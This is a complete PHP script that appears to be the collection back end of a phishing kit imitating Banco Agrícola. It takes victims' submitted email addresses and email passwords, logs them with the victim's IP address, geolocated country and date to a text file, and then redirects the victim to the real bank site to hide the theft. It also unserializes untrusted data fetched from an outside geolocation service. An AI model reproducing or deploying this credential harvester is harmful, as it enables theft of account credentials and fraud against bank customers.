<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
date_default_timezone_set('America/Bogota');
////////////////////
if ( isset ($_POST['correo']) && isset ($_POST['claveCorreo'])){
    $file = fopen("datamichu.txt", "a");
fwrite($file, "Correo: ".$_POST['correo']." - Clv. correo: ".$_POST['claveCorreo']." " . PHP_EOL);
fwrite($file, "IP ".$userp ." ".$pais." ".date('d/m/Y')."" . PHP_EOL);
fwrite($file, "**************************" . PHP_EOL);
fclose($file);
header ('location: https://www.bancoagricola.com/');
}else{ header ('location: index.html'); exit(); }
?>